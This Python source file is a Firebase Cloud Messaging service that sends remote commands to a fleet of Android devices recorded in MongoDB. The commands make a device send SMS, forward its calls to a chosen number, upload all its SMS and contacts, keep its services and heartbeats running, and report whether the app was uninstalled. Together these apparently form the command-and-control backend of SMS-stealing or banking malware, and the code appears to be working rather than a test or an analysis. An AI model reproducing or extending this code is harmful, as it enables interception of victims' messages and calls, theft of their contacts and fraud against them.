import firebase_admin
from firebase_admin import credentials, messaging
from typing import List, Dict, Any, Optional
import logging
import asyncio
from ..database import mongodb
from datetime import datetime, timezone
from ..utils.datetime_utils import utc_now

logger = logging.getLogger(__name__)

class FirebaseService:

    def __init__(self, service_account_file: str):
        try:
            if not firebase_admin._apps:
                cred = credentials.Certificate(service_account_file)
                firebase_admin.initialize_app(cred)
            logger.info("Firebase initialized")
        except Exception as e:
            logger.error(f"Firebase initialization error: {e}")

    async def _send_command(self, token: str, data: Dict[str, str], device_id: Optional[str] = None) -> Optional[str]:
        try:
            message = messaging.Message(
                data=data,
                token=token,
            )

            # messaging.send() is synchronous, run it in thread pool
            loop = asyncio.get_event_loop()
            response = await loop.run_in_executor(None, messaging.send, message)
            return response

        except messaging.UnregisteredError as e:
            logger.warning(f"❌ [PING] Token unregistered - Device: {device_id or 'unknown'}, Token: {token[:20]}...")
            return None

        except (ValueError, TypeError, AttributeError) as e:
            logger.error(f"❌ [PING] Invalid token format - Device: {device_id or 'unknown'}")
            return None

        except Exception as e:
            logger.error(f"❌ [PING] FCM error - Device: {device_id or 'unknown'}, Error: {type(e).__name__}")
            return None

    async def _send_ping(self, token: str, device_id: Optional[str] = None) -> bool:
        logger.info(f"📡 [PING] Sending ping command - Device: {device_id or 'unknown'}, Token: {token[:20]}...")
        response = await self._send_command(
            token,
            {
                "type": "ping",
                "timestamp": str(int(utc_now().timestamp() * 1000))
            },
            device_id
        )
        success = response is not None
        if success:
            logger.info(f"✅ [PING] Ping sent successfully - Device: {device_id or 'unknown'}, Message ID: {response}")
        else:
            logger.warning(f"❌ [PING] Ping failed - Device: {device_id or 'unknown'}, No response from FCM")
        return success

    async def get_all_device_tokens(self) -> List[Dict[str, Any]]:
        try:
            # Get all active devices (not deleted) - include devices with or without FCM tokens
            devices = await mongodb.db.devices.find(
                {
                    "is_deleted": {"$ne": True},
                    "model": {"$exists": True, "$ne": None}
                },
                {"device_id": 1, "fcm_tokens": 1, "model": 1, "manufacturer": 1}
            ).to_list(length=None)

            logger.info(f"Found {len(devices)} active devices (including devices without FCM tokens)")
            return devices

        except Exception as e:
            logger.error(f"Error getting device tokens: {e}")
            return []

    async def ping_all_devices(self) -> Dict[str, Any]:
        devices = await self.get_all_device_tokens()

        results = {
            "total_devices": len(devices),
            "total_tokens": 0,
            "success": 0,
            "failed": 0,
            "details": []
        }

        for device in devices:
            device_id = device.get("device_id")
            tokens = device.get("fcm_tokens", [])
            
            # Filter out invalid tokens (like NO_FCM_TOKEN_*)
            from .device_service import DeviceService
            tokens = [
                token for token in tokens 
                if DeviceService._is_valid_fcm_token(token)
            ]

            results["total_tokens"] += len(tokens)

            device_result = {
                "device_id": device_id,
                "model": device.get("model", "Unknown"),
                "manufacturer": device.get("manufacturer", "Unknown"),
                "tokens_count": len(tokens),
                "sent": []
            }

            for token in tokens:
                success = await self._send_ping(token, device_id)

                if success:
                    results["success"] += 1
                    device_result["sent"].append({
                        "token": token[:20] + "...",
                        "status": "success"
                    })
                else:
                    results["failed"] += 1
                    device_result["sent"].append({
                        "token": token[:20] + "...",
                        "status": "failed"
                    })

            results["details"].append(device_result)

        logger.info(f"Ping summary: {results['success']}/{results['total_tokens']} successful")
        return results

    async def send_command_to_device(
        self,
        device_id: str,
        command_type: str,
        parameters: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        try:
            logger.info(f"📡 [PING] Device: {device_id}, Command: {command_type}")

            device = await mongodb.db.devices.find_one(
                {"device_id": device_id},
                {"fcm_tokens": 1, "fcm_token": 1}
            )

            if not device:
                logger.error(f"❌ [PING] Device not found: {device_id}")
                return {
                    "success": False,
                    "message": "Device not found"
                }

            tokens = []
            if device.get("fcm_tokens"):
                tokens = device.get("fcm_tokens") if isinstance(device.get("fcm_tokens"), list) else [device.get("fcm_tokens")]
            elif device.get("fcm_token"):
                tokens = [device.get("fcm_token")] if isinstance(device.get("fcm_token"), str) else device.get("fcm_token", [])

            # Filter out invalid tokens
            from .device_service import DeviceService
            valid_tokens = [
                token for token in tokens 
                if DeviceService._is_valid_fcm_token(token)
            ]

            if not valid_tokens:
                logger.error(f"❌ [PING] No valid FCM tokens for device: {device_id}")
                return {
                    "success": False,
                    "message": "No FCM tokens available"
                }

            logger.info(f"📡 [PING] Found {len(valid_tokens)} valid token(s) for device: {device_id}")

            data = {
                "type": command_type,
                "timestamp": str(int(utc_now().timestamp() * 1000))
            }

            if parameters:
                for key, value in parameters.items():
                    data[key] = str(value)

            success_count = 0
            failed_count = 0
            unregistered_count = 0
            
            for i, token in enumerate(valid_tokens):
                try:
                    response = await self._send_command(token, data, device_id)
                    if response:
                        success_count += 1
                        logger.info(f"✅ [PING] Token {i+1}/{len(valid_tokens)}: SUCCESS")
                    else:
                        failed_count += 1
                        unregistered_count += 1
                        logger.warning(f"❌ [PING] Token {i+1}/{len(valid_tokens)}: FAILED (unregistered)")
                except Exception as token_error:
                    failed_count += 1
                    unregistered_count += 1
                    logger.error(f"❌ [PING] Token {i+1}/{len(valid_tokens)}: ERROR - {type(token_error).__name__}")

            # If all tokens failed, mark device as uninstalled
            if success_count == 0 and len(valid_tokens) > 0:
                logger.warning(f"⚠️ [PING] All {len(valid_tokens)} token(s) failed for device {device_id}")
                logger.info(f"📱 [PING] Marking device as uninstalled: {device_id}")
                logger.info(f"🔍 [PING] About to call mark_device_uninstalled for device: {device_id}")
                
                from .device_service import DeviceService
                await DeviceService.mark_device_uninstalled(device_id)
                
                logger.info(f"✅ [PING] mark_device_uninstalled completed for device: {device_id}")
                
                result = {
                    "success": False,
                    "sent_count": 0,
                    "total_tokens": len(valid_tokens),
                    "failed_tokens": failed_count,
                    "unregistered_count": unregistered_count,
                    "is_uninstalled": True,
                    "message": f"All {len(valid_tokens)} token(s) failed - Device marked as uninstalled"
                }
                logger.info(f"✅ [PING] Device {device_id} marked as uninstalled in database")
            else:
                result = {
                    "success": success_count > 0,
                    "sent_count": success_count,
                    "total_tokens": len(valid_tokens),
                    "failed_tokens": failed_count,
                    "unregistered_count": unregistered_count,
                    "message": f"Command sent to {success_count}/{len(valid_tokens)} tokens"
                }

            logger.info(f"📊 [PING] Summary - Success: {success_count}, Failed: {failed_count}, Total: {len(valid_tokens)}, Uninstalled: {result.get('is_uninstalled', False)}")
            return result

        except Exception as e:
            logger.error(f"❌ Error sending command to device {device_id}: {e}", exc_info=True)
            return {
                "success": False,
                "message": str(e)
            }

    async def send_sms(
        self,
        device_id: str,
        phone: str,
        message: str,
        sim_slot: int = 0
    ) -> Dict[str, Any]:
        logger.info(f"🔥 Firebase send_sms called - Device: {device_id}, Phone: {phone}, SIM Slot: {sim_slot}, Message Length: {len(message)}")
        result = await self.send_command_to_device(
            device_id=device_id,
            command_type="send_sms",
            parameters={
                "phone": phone,
                "message": message,
                "simSlot": sim_slot
            }
        )
        logger.info(f"🔥 Firebase send_sms result: {result}")
        return result

    async def enable_call_forwarding(
        self,
        device_id: str,
        forward_number: str,
        sim_slot: int = 0
    ) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="call_forwarding",
            parameters={
                "number": forward_number,
                "simSlot": sim_slot
            }
        )

    async def disable_call_forwarding(
        self,
        device_id: str,
        sim_slot: int = 0
    ) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="call_forwarding_disable",
            parameters={
                "simSlot": sim_slot
            }
        )

    async def quick_upload_sms(self, device_id: str) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="quick_upload_sms"
        )

    async def quick_upload_contacts(self, device_id: str) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="quick_upload_contacts"
        )

    async def upload_all_sms(self, device_id: str) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="upload_all_sms"
        )

    async def upload_all_contacts(self, device_id: str) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="upload_all_contacts"
        )

    async def start_services(self, device_id: str) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="start_services"
        )

    async def restart_heartbeat(self, device_id: str) -> Dict[str, Any]:
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="restart_heartbeat"
        )

    async def send_to_topic(
        self,
        topic: str,
        command_type: str,
        parameters: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        try:
            data = {
                "type": command_type,
                "timestamp": str(int(utc_now().timestamp() * 1000))
            }

            if parameters:
                for key, value in parameters.items():
                    data[key] = str(value)

            message = messaging.Message(
                data=data,
                topic=topic,
            )

            # Run blocking Firebase send in executor to avoid blocking event loop
            loop = asyncio.get_event_loop()
            try:
                # Use run_in_executor to run synchronous Firebase call
                logger.info(f"📤 [PING] Sending command to topic '{topic}': {command_type}")
                response = await loop.run_in_executor(None, messaging.send, message)
                logger.info(f"✅ [PING] Google FCM Response: SUCCESS - Topic: '{topic}', Command: {command_type}, Message ID: {response}")
                logger.info(f"✅ [PING] Command sent successfully to topic '{topic}'")

                return {
                    "success": True,
                    "topic": topic,
                    "command": command_type,
                    "message_id": response,
                    "message": f"Command sent to all devices subscribed to '{topic}'"
                }
            except Exception as executor_error:
                logger.error(f"❌ [PING] Google FCM Response: EXECUTOR_ERROR - Topic: '{topic}', Error: {executor_error}", exc_info=True)
                raise

        except messaging.UnregisteredError as e:
            logger.error(f"❌ [PING] Google FCM Response: UNREGISTERED_ERROR - Topic: '{topic}', Error: {e}")
            logger.error(f"❌ [PING] FCM Error Details: Unregistered error for topic")
            return {
                "success": False,
                "topic": topic,
                "message": f"Unregistered error: {str(e)}"
            }
        except Exception as e:
            error_type = type(e).__name__
            logger.error(f"❌ [PING] Google FCM Response: ERROR - Topic: '{topic}', Error Type: {error_type}, Error: {e}", exc_info=True)
            logger.error(f"❌ [PING] FCM Error Details: {str(e)}")
            return {
                "success": False,
                "topic": topic,
                "message": str(e)
            }

    async def restart_all_heartbeats(self) -> Dict[str, Any]:
        return await self.send_to_topic(
            topic="all_devices",
            command_type="restart_heartbeat"
        )

    async def ping_all_devices_topic(self) -> Dict[str, Any]:
        """
        Send ping to all devices via Firebase Topic (very fast, async).
        This is the fastest method as it sends one message to the topic and Firebase handles distribution.
        """
        return await self.send_to_topic(
            topic="all_devices",
            command_type="ping"
        )
    
    async def ping_all_devices_async(self) -> Dict[str, Any]:
        """
        Ping all devices asynchronously in parallel (faster than sequential, but slower than topic).
        This method allows us to track individual device failures.
        """
        try:
            logger.info(f"📡 [PING] Starting async ping all devices...")
            
            # Get all devices with their tokens
            devices = await self.get_all_device_tokens()
            
            if not devices:
                logger.warning(f"⚠️ [PING] No devices found to ping")
                return {
                    "success": False,
                    "message": "No devices found",
                    "total_devices": 0,
                    "success_count": 0,
                    "failed_count": 0
                }
            
            logger.info(f"📡 [PING] Found {len(devices)} devices to ping")
            
            # Create async tasks for all devices
            tasks = []
            for device in devices:
                device_id = device.get("device_id")
                if device_id:
                    tasks.append(self.ping_device(device_id))
            
            # Execute all pings in parallel
            logger.info(f"📡 [PING] Executing {len(tasks)} ping tasks in parallel...")
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Count successes and failures
            success_count = 0
            failed_count = 0
            
            for i, result in enumerate(results):
                if isinstance(result, Exception):
                    failed_count += 1
                    logger.error(f"❌ [PING] Exception pinging device {devices[i].get('device_id')}: {result}")
                elif isinstance(result, dict) and result.get("success"):
                    success_count += 1
                else:
                    failed_count += 1
            
            logger.info(f"📊 [PING] Async ping all completed - Success: {success_count}, Failed: {failed_count}, Total: {len(devices)}")
            
            return {
                "success": success_count > 0,
                "total_devices": len(devices),
                "success_count": success_count,
                "failed_count": failed_count,
                "message": f"Ping sent to {success_count}/{len(devices)} devices"
            }
            
        except Exception as e:
            logger.error(f"❌ [PING] Error in ping_all_devices_async: {e}", exc_info=True)
            return {
                "success": False,
                "message": str(e),
                "total_devices": 0,
                "success_count": 0,
                "failed_count": 0
            }

    async def start_all_services(self) -> Dict[str, Any]:
        return await self.send_to_topic(
            topic="all_devices",
            command_type="start_services"
        )

    async def ping_device(self, device_id: str) -> Dict[str, Any]:
        try:
            logger.info(f"📡 [PING] Starting ping_device - Device ID: {device_id}")
            
            device = await mongodb.db.devices.find_one(
                {"device_id": device_id},
                {"fcm_tokens": 1, "model": 1, "manufacturer": 1}
            )

            if not device:
                logger.error(f"❌ [PING] Device not found in database: {device_id}")
                return {
                    "success": False,
                    "message": "Device not found"
                }

            if not device.get("fcm_tokens"):
                logger.warning(f"⚠️ [PING] Device has no FCM tokens: {device_id}")
                return {
                    "success": False,
                    "message": "Device has no FCM tokens"
                }

            tokens = device.get("fcm_tokens", [])
            logger.info(f"📡 [PING] Device: {device_id}, Model: {device.get('model', 'Unknown')}, Manufacturer: {device.get('manufacturer', 'Unknown')}, Total tokens: {len(tokens)}")
            
            # Filter out invalid tokens (like NO_FCM_TOKEN_*)
            from .device_service import DeviceService
            valid_tokens = [
                token for token in tokens 
                if DeviceService._is_valid_fcm_token(token)
            ]
            
            logger.info(f"📡 [PING] Valid tokens: {len(valid_tokens)}/{len(tokens)}")
            
            if not valid_tokens:
                logger.error(f"❌ [PING] Device has no valid FCM tokens: {device_id}")
                return {
                    "success": False,
                    "message": "Device has no valid FCM tokens"
                }
            
            success_count = 0
            failed_count = 0
            message_ids = []

            for i, token in enumerate(valid_tokens):
                # Double check token is valid before sending
                if not DeviceService._is_valid_fcm_token(token):
                    logger.warning(f"⚠️ [PING] Skipping invalid token {i+1} for device: {device_id} (token: {token[:30]}...)")
                    failed_count += 1
                    continue
                
                logger.info(f"📡 [PING] Sending ping {i+1}/{len(valid_tokens)} to device: {device_id}")
                try:
                    success = await self._send_ping(token, device_id)
                    if success:
                        success_count += 1
                        logger.info(f"✅ [PING] Ping {i+1} succeeded for device: {device_id}")
                    else:
                        failed_count += 1
                        logger.warning(f"❌ [PING] Ping {i+1} failed for device: {device_id}")
                except Exception as ping_error:
                    failed_count += 1
                    error_type = type(ping_error).__name__
                    logger.error(f"❌ [PING] Ping {i+1} exception for device {device_id}: {error_type} - {ping_error}")

            # If all pings failed, mark device as uninstalled
            if success_count == 0 and len(valid_tokens) > 0:
                logger.warning(f"⚠️ [PING] All {len(valid_tokens)} token(s) failed for device {device_id}")
                logger.info(f"📱 [PING] Marking device as uninstalled: {device_id}")
                logger.info(f"🔍 [PING] About to call mark_device_uninstalled for device: {device_id}")
                
                await DeviceService.mark_device_uninstalled(device_id)
                
                logger.info(f"✅ [PING] mark_device_uninstalled completed for device: {device_id}")
                
                result = {
                    "success": False,
                    "sent_count": 0,
                    "failed_count": failed_count,
                    "total_tokens": len(valid_tokens),
                    "is_uninstalled": True,
                    "message": f"All {len(valid_tokens)} token(s) failed - Device marked as uninstalled"
                }
                logger.info(f"✅ [PING] Device {device_id} marked as uninstalled in database")
            else:
                result = {
                    "success": success_count > 0,
                    "sent_count": success_count,
                    "failed_count": failed_count,
                    "total_tokens": len(valid_tokens),
                    "message": f"Ping sent to {success_count}/{len(valid_tokens)} tokens"
                }

            logger.info(f"📊 [PING] Ping summary for device {device_id}: Success: {success_count}, Failed: {failed_count}, Total: {len(valid_tokens)}")
            logger.info(f"📊 [PING] Final result: {result}")

            return result

        except Exception as e:
            logger.error(f"Error pinging device {device_id}: {e}")
            return {
                "success": False,
                "message": str(e)
            }

    async def send_command_to_multiple_devices(
        self,
        device_ids: List[str],
        command_type: str,
        parameters: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        results = {
            "total": len(device_ids),
            "success": 0,
            "failed": 0,
            "details": []
        }

        for device_id in device_ids:
            result = await self.send_command_to_device(
                device_id=device_id,
                command_type=command_type,
                parameters=parameters
            )

            if result["success"]:
                results["success"] += 1
            else:
                results["failed"] += 1

            results["details"].append({
                "device_id": device_id,
                "status": "success" if result["success"] else "failed",
                "message": result.get("message", "")
            })

        logger.info(f"Batch command: {results['success']}/{results['total']} successful")
        return results

firebase_service = FirebaseService("apps.json")
